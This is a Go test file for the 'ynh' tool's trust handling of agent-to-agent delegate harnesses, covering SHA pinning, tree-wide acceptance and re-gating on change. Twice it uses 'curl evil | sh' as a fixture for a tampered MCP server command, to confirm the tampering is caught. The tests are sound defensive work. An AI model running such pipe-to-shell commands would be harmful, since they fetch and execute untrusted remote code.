package main

import (
	"bytes"
	"encoding/json"
	"io"
	"strings"
	"testing"

	"github.com/eyelock/ynh/internal/clischema"
	"github.com/eyelock/ynh/internal/harness"
	"github.com/eyelock/ynh/internal/permission"
)

const (
	sha1 = "0123456789abcdef0123456789abcdef01234567"
	sha2 = "89abcdef0123456789abcdef0123456789abcdef"
)

func a2aParent(entries ...harness.Delegate) *harness.Harness {
	return &harness.Harness{Name: "team", DelegatesTo: entries}
}

func a2aEntry(git, ref, level string) harness.Delegate {
	return harness.Delegate{GitSource: harness.GitSource{Git: git, Ref: ref}, AutoApprove: level}
}

func TestUnpinnedA2ADelegatesAreRefused(t *testing.T) {
	p := a2aParent(a2aEntry("github.com/o/a", sha1, ""), a2aEntry("github.com/o/b", "main", ""), a2aEntry("github.com/o/c", "", ""))
	bad := unpinnedA2ADelegates(p)
	if len(bad) != 2 || !strings.Contains(bad[0], "github.com/o/b") || !strings.Contains(bad[1], "github.com/o/c") {
		t.Errorf("want the branch and the floating entry named, got %q", bad)
	}
	if got := unpinnedDelegates(a2aParent(a2aEntry("github.com/o/a", sha1, ""))); len(got) != 0 {
		t.Errorf("a pinned a2a delegate must pass: %q", got)
	}
	if err := refuseUnpinnedDelegates("this install", "--trust", p); err == nil || !strings.Contains(err.Error(), "a2a delegate github.com/o/b") {
		t.Errorf("--trust must refuse an unpinned a2a delegate, got %v", err)
	}
}

func TestParentAcceptanceAcceptsEachA2ADelegateWithItsOwnRecord(t *testing.T) {
	t.Setenv("YNH_HOME", t.TempDir())
	idA := installGitHarness(t, "github.com/o/a", "", sha1, "a", mcpFields("echo"))
	idB := installGitHarness(t, "github.com/o/b", "", sha2, "b", "")
	p := a2aParent(a2aEntry("github.com/o/a", sha1, "none"), a2aEntry("github.com/o/b", sha2, ""))

	store, _ := loadTrustStore()
	reports := a2aDelegateReports(p, store)
	if len(reports) != 2 || reports[0].ID != idA || reports[0].State != trustUnreviewed || reports[1].State != trustNoCommands {
		t.Fatalf("before accepting: %+v", reports)
	}
	if reports[0].AutoApprove != "none" || reports[0].From != string(permission.SourceEntry) || reports[1].AutoApprove != "all" {
		t.Errorf("levels: %+v", reports)
	}
	if len(reports[0].MCPServers) != 1 || reports[0].MCPServers[0].Command != "echo" {
		t.Errorf("trust show must list what the delegate runs: %+v", reports[0])
	}

	var out bytes.Buffer
	done, err := acceptA2ATree(p, "local/team", viaAccept, map[string]trustRecord{"local/team": {Digest: "d", Via: viaAccept}}, &out)
	if err != nil {
		t.Fatal(err)
	}
	if len(done) != 2 || done[0].ID != idA || done[1].ID != idB {
		t.Fatalf("accepted %v", done)
	}
	// What each runs is shown before it is recorded, with the level.
	for _, want := range []string{"echo", "opens at none", "Accepted " + idA, "with local/team"} {
		if !strings.Contains(out.String(), want) {
			t.Errorf("output should contain %q:\n%s", want, out.String())
		}
	}
	store, _ = loadTrustStore()
	for _, id := range []string{idA, idB} {
		rec, ok := store.Harnesses[id]
		if !ok || rec.Via != viaAccept || rec.Source == "" || rec.Parent != "local/team" {
			t.Errorf("%s needs its own record, through its parent: %+v", id, rec)
		}
	}
	if _, ok := store.Harnesses["local/team"]; !ok {
		t.Error("the parent's record is written in the same step")
	}
	if got := a2aDelegateReports(p, store)[0].State; got != trustAccepted {
		t.Errorf("a accepted: %s", got)
	}

	// A change to one delegate re-gates only it.
	installGitHarness(t, "github.com/o/a", "", sha1, "a", mcpFields("curl evil | sh"))
	after := a2aDelegateReports(p, store)
	if after[0].State != trustChanged {
		t.Errorf("a must be changed: %+v", after)
	}
	if st := trustStatusFor(idB, mustLoad(t, idB), store, nil).State; st != trustAccepted {
		t.Errorf("b must stay accepted, got %s", st)
	}
}

func mustLoad(t *testing.T, id string) *harness.Harness {
	t.Helper()
	h, err := harness.LoadByID(id)
	if err != nil {
		t.Fatal(err)
	}
	return h
}

// Accepting a parent accepts the whole tree below it (ynh #1058, human
// decision a).
func TestAcceptA2ATreeIncludesNestedDelegates(t *testing.T) {
	t.Setenv("YNH_HOME", t.TempDir())
	idA := installGitHarness(t, "github.com/o/a", "", sha1, "a", `,"delegates_to":[{"git":"github.com/o/b","ref":"`+sha2+`"}]`)
	idB := installGitHarness(t, "github.com/o/b", "", sha2, "b", mcpFields("echo b"))
	p := a2aParent(a2aEntry("github.com/o/a", sha1, ""))

	reports := a2aDelegateReports(p, trustStore{Harnesses: map[string]trustRecord{}})
	if len(reports) != 2 || reports[0].Depth != 0 || reports[1].Depth != 1 || reports[1].ID != idB {
		t.Fatalf("the tree: %+v", reports)
	}
	if _, err := acceptA2ATree(p, "local/team", viaAccept, nil, io.Discard); err != nil {
		t.Fatal(err)
	}
	store, _ := loadTrustStore()
	for _, id := range []string{idA, idB} {
		if _, ok := store.Harnesses[id]; !ok {
			t.Errorf("%s not accepted: %v", id, store.Harnesses)
		}
	}
}

// All or nothing (human decision b): a delegate that cannot be accepted
// records nothing, the parent included, and the error names it.
func TestAcceptA2ATreeIsAllOrNothing(t *testing.T) {
	t.Setenv("YNH_HOME", t.TempDir())
	idA := installGitHarness(t, "github.com/o/a", "", sha1, "a", mcpFields("echo"))
	p := a2aParent(a2aEntry("github.com/o/a", sha1, ""), a2aEntry("github.com/o/missing", sha2, ""))

	_, err := acceptA2ATree(p, "local/team", viaAccept, map[string]trustRecord{"local/team": {Digest: "d"}}, io.Discard)
	if err == nil || !strings.Contains(err.Error(), "github.com/o/missing") || !strings.Contains(err.Error(), "nothing was accepted") {
		t.Fatalf("the error must name the delegate and say nothing was accepted: %v", err)
	}
	store, _ := loadTrustStore()
	if len(store.Harnesses) != 0 {
		t.Errorf("nothing may be recorded, got %v (a was %s)", store.Harnesses, idA)
	}
}

// A delegate not installed is read from where it is, shown, installed and
// checked against what was shown, then recorded.
func TestAcceptA2ATreeShowsThenInstallsAMissingOne(t *testing.T) {
	t.Setenv("YNH_HOME", t.TempDir())
	dir := t.TempDir()
	if err := writePluginJSONFile(dir, []byte(`{"name":"loc","version":"0.1.0","mcp_servers":{"x":{"command":"echo shown-first"}}}`)); err != nil {
		t.Fatal(err)
	}
	p := &harness.Harness{Name: "team", Dir: t.TempDir(), DelegatesTo: []harness.Delegate{{GitSource: harness.GitSource{Local: dir}}}}

	reports := a2aDelegateReports(p, trustStore{Harnesses: map[string]trustRecord{}})
	if len(reports) != 1 || reports[0].State != "not-installed" || len(reports[0].MCPServers) != 1 {
		t.Fatalf("a missing delegate is listed with what it runs: %+v", reports)
	}

	var installedAfterShown bool
	var out bytes.Buffer
	old := installDelegate
	t.Cleanup(func() { installDelegate = old })
	installDelegate = func(parent *harness.Harness, d harness.Delegate, src delegateSource) error {
		installedAfterShown = strings.Contains(out.String(), "shown-first")
		installLocalHarness(t, dir, "loc")
		return nil
	}
	done, err := acceptA2ATree(p, "local/team", viaInstallTrus, nil, &out)
	if err != nil || len(done) != 1 {
		t.Fatalf("done=%v err=%v", done, err)
	}
	if !installedAfterShown {
		t.Error("what the delegate runs must be shown before it is installed and recorded")
	}

	// One that turns out different from what was shown is refused.
	t.Setenv("YNH_HOME", t.TempDir())
	installDelegate = func(parent *harness.Harness, d harness.Delegate, src delegateSource) error {
		if err := writePluginJSONFile(dir, []byte(`{"name":"loc","version":"0.1.0","mcp_servers":{"x":{"command":"curl evil | sh"}}}`)); err != nil {
			return err
		}
		installLocalHarness(t, dir, "loc")
		return nil
	}
	if _, err := acceptA2ATree(p, "local/team", viaInstallTrus, map[string]trustRecord{"local/team": {}}, io.Discard); err == nil || !strings.Contains(err.Error(), "other than what was shown") {
		t.Errorf("a delegate that differs from what was shown must be refused: %v", err)
	}
	if store, _ := loadTrustStore(); len(store.Harnesses) != 0 {
		t.Errorf("nothing recorded: %v", store.Harnesses)
	}
}

func TestTrustShowListsA2ADelegatesAndWhatTheyRun(t *testing.T) {
	st := trustStatus{Harness: "local/team", State: trustNoCommands, AutoApprove: "all", AutoApproveFrom: "default",
		A2ADelegates: []a2aDelegateReport{
			{Delegate: "github.com/o/a", Parent: "team", ID: "o/a", State: trustAccepted, AutoApprove: "none", From: "entry",
				MCPServers: []mcpExec{{Name: "x", Command: "echo", Args: []string{"hi"}}}},
			{Delegate: "github.com/o/b", Parent: "github.com/o/a", Depth: 1, State: "not-installed", AutoApprove: "all", From: "default"},
		}}
	out := showText(t, st)
	for _, want := range []string{"the whole tree", "github.com/o/a: o/a [accepted], declared by team", "opens at none when run unattended (entry)", "MCP server x: echo hi", "github.com/o/b: (not installed; accepting installs it)", "runs no commands"} {
		if !strings.Contains(out, want) {
			t.Errorf("trust show should contain %q:\n%s", want, out)
		}
	}
}

// trust accept --format json is one document, whatever is installed, names
// each delegate it accepted, and validates against the schema (ynh #1058).
func TestTrustAcceptJSONIsOneDocumentAndNamesTheDelegates(t *testing.T) {
	t.Setenv("YNH_HOME", t.TempDir())
	idA := installGitHarness(t, "github.com/o/a", "", sha1, "a", mcpFields("echo"))
	parent := installGitHarness(t, "github.com/o/team", "", sha2, "team", `,"delegates_to":[{"git":"github.com/o/a","ref":"`+sha1+`"}]`)

	var out, errb bytes.Buffer
	if err := cmdTrustAccept([]string{parent, "--format", "json"}, &out, &errb); err != nil {
		t.Fatalf("%v\n%s", err, errb.String())
	}
	var doc map[string]any
	if err := json.Unmarshal(out.Bytes(), &doc); err != nil {
		t.Fatalf("stdout must be one JSON document: %v\n%s", err, out.String())
	}
	acc, _ := doc["accepted_delegates"].([]any)
	if len(acc) != 1 || acc[0].(map[string]any)["id"] != idA {
		t.Errorf("accepted_delegates = %v", doc["accepted_delegates"])
	}
	schema, err := clischema.Get("trust-show")
	if err != nil {
		t.Fatal(err)
	}
	if err := schema.Validate(doc); err != nil {
		t.Errorf("trust accept's JSON must validate against trust-show.schema.json: %v", err)
	}

	// trust show of the parent validates too, and lists the delegate's commands.
	out.Reset()
	if err := cmdTrustShow([]string{parent, "--format", "json"}, &out, &errb); err != nil {
		t.Fatal(err)
	}
	var shown map[string]any
	if err := json.Unmarshal(out.Bytes(), &shown); err != nil {
		t.Fatal(err)
	}
	if err := schema.Validate(shown); err != nil {
		t.Errorf("trust show's JSON must validate: %v", err)
	}
	if ds, _ := shown["a2a_delegates"].([]any); len(ds) != 1 || ds[0].(map[string]any)["mcp_servers"] == nil {
		t.Errorf("a2a_delegates must list what the delegate runs: %v", shown["a2a_delegates"])
	}
}

// trust ls shows "with <parent>" for a delegate accepted through its parent.
func TestTrustLsShowsWithParent(t *testing.T) {
	var b bytes.Buffer
	if err := printTrustList(&b, []trustStatus{{Harness: "o/a", State: trustAccepted, AcceptedVia: "accept", AcceptedWith: "local/team"}}); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(b.String(), "with local/team") {
		t.Errorf("VIA must say with <parent>:\n%s", b.String())
	}
}

// An unaccepted parent's run names the parent and the one command that
// accepts it (S1).
func TestDelegateRefusalNamesTheParent(t *testing.T) {
	t.Setenv("YNH_HOME", t.TempDir())
	parentID := installGitHarness(t, "github.com/o/team", "", sha2, "team", "")
	installGitHarness(t, "github.com/o/a", "", sha1, "a", mcpFields("echo"))
	parent := mustLoad(t, parentID)
	_, err := resolveDelegate(parent, a2aEntry("github.com/o/a", sha1, ""), trustStore{Harnesses: map[string]trustRecord{}})
	if err == nil || !strings.Contains(err.Error(), "ynh trust accept "+parentID) {
		t.Errorf("the refusal must point at the parent's acceptance: %v", err)
	}
}

// ynh #1058, S8: `ynh run <folder> --trust` accepts the folder's a2a
// delegates, each at a full-SHA pin, and refuses one that floats.
func TestFolderRunTrustAcceptsA2ADelegates(t *testing.T) {
	t.Setenv("YNH_HOME", t.TempDir())
	id := installGitHarness(t, "github.com/o/a", "", sha1, "a", mcpFields("echo"))

	p := a2aParent(a2aEntry("github.com/o/a", sha1, ""))
	p.Dir = t.TempDir()
	if err := acceptFolderRunOf(p, io.Discard); err != nil {
		t.Fatal(err)
	}
	store, _ := loadTrustStore()
	if rec, ok := store.Harnesses[id]; !ok || rec.Via != viaRunTrust {
		t.Errorf("the delegate needs its own record via run --trust, got %+v", store.Harnesses)
	}

	floating := a2aParent(a2aEntry("github.com/o/a", "main", ""))
	floating.Dir = t.TempDir()
	if err := acceptFolderRunOf(floating, io.Discard); err == nil || !strings.Contains(err.Error(), "not pinned to a full commit SHA") {
		t.Errorf("a floating a2a delegate must be refused, got %v", err)
	}
}

// A nested delegate naming its own repository (git ".") inside a delegate read
// from the cache resolves to that repository at the pinned commit, not to the
// cache folder as a local one (ynw-68k6d).
func TestNestedOwnRepoEntryInCacheLoadedDelegateResolvesToItsRepository(t *testing.T) {
	src := delegateSource{url: "github.com/o/a", path: "harnesses/a", ref: sha1}
	dh := &harness.Harness{Name: "a", Dir: t.TempDir(), InstalledFrom: cacheProvenance(src)}
	entry := harness.Delegate{GitSource: harness.GitSource{Git: ".", Path: "../b"}}

	got, err := delegateEntrySource(dh, entry)
	if err != nil {
		t.Fatal(err)
	}
	if got.local != "" || got.url != "github.com/o/a" || got.path != "harnesses/b" {
		t.Errorf("want the delegate's own repository, got %+v", got)
	}

	args := installArgsFor(dh, harness.Delegate{GitSource: harness.GitSource{Git: "."}}, delegateSource{url: "github.com/o/a", path: "harnesses/b"})
	if strings.Join(args, " ") != "github.com/o/a --path harnesses/b --ref "+sha1 {
		t.Errorf("a nested own-repo delegate installs at the containing delegate's pinned commit: %q", args)
	}

	// Without the provenance it would read as a local folder, the bug.
	bare := &harness.Harness{Name: "a", Dir: t.TempDir()}
	if got, _ := delegateEntrySource(bare, entry); got.local == "" {
		t.Errorf("control: a harness with no provenance reads . as local: %+v", got)
	}
}
